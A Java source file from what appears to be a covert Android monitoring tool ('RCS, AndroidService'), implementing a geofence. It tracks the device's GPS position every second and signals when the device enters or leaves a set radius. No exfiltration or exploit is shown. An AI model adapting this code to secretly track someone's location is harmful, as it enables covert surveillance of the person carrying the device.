/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocatorDistance.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.position;

import android.app.PendingIntent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class GPSLocatorDistance extends GPSLocator implements LocationListener {
	private static final String TAG = "GPSLocDist"; //$NON-NLS-1$
	private final float latitude;
	private final float longitude;
	private final float distance;
	private long expiration;
	private PendingIntent intent;
	private final RangeObserver rangeObserver;
	private Location location;

	boolean entered = false;

	public GPSLocatorDistance(RangeObserver listener, float latitude, float longitude, float distance) {
		super();

		this.rangeObserver = listener;
		this.latitude = latitude;
		this.longitude = longitude;
		this.distance = distance;

		setListener(this);
	}

	public void initLocationUpdates() {
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1L, this);
	}

	public void onLocationChanged(Location location) {
		if (this.location == null) {
			this.location = new Location(location);
			this.location.setLatitude(latitude);
			this.location.setLongitude(longitude);
		}

		final float actualDistance = this.location.distanceTo(location);

		if (actualDistance < distance) {
			if (!entered) {

				rangeObserver.notification(true);
				entered = true;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Already entered");//$NON-NLS-1$
				}
			}
		} else {
			if (entered) {

				rangeObserver.notification(false);
				entered = false;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Already exited");//$NON-NLS-1$
				}
			}
		}
	}

	public void onProviderDisabled(String arg0) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " onProviderDisabled: " + arg0);//$NON-NLS-1$
		}

	}

	public void onProviderEnabled(String arg0) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " onProviderEnabled: " + arg0);//$NON-NLS-1$
		}
	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " onStatusChanged: " + arg0 + "," + arg1);//$NON-NLS-1$ //$NON-NLS-2$
		}
	}
}
